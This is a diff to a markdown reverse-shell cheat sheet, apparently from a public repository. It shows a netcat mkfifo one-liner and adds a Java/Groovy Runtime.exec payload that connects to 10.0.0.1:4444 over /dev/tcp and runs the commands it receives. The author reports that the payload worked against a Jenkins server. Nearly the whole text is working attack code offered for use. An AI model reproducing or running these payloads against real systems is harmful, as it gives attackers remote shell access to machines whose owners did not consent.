@@ -48,3 +48,12 @@ Since there is multiple different versions of netcat, the syntax can be differen
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
 ```
+  
+## Java &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/java.jpg" width="40"/>
+Tried it on a Jenkins local server and works like a charm
+  
+```
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
